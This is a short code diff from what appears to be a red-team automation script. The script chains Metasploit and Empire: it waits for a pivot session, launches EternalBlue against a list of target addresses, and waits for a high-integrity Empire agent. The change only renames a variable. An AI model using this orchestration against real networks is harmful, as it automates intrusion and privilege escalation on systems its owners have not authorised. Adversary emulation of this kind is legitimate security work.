@@ -19,7 +19,7 @@ from stage3.escalate_privilege.windows import msf_eternal_blue
 
 # Set both API instances for MSF & Empire
 msf_API = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
-empireAPI = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
+empire_API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
 
 # Step 1 - Wait for pivot
 msf_session_id = msf_wait_for_session.run(msf_API)
@@ -54,5 +54,5 @@ for target_address in targets:
         print('Launched EB against ' + target_address)
 
 # Step 6 - Wait for high_integrity empire agent; 
-empire_agent = empire_wait_for_agent.run(empireAPI, need_privilege=True)
+empire_agent = empire_wait_for_agent.run(empire_API, need_privilege=True)
 print(empire_agent)
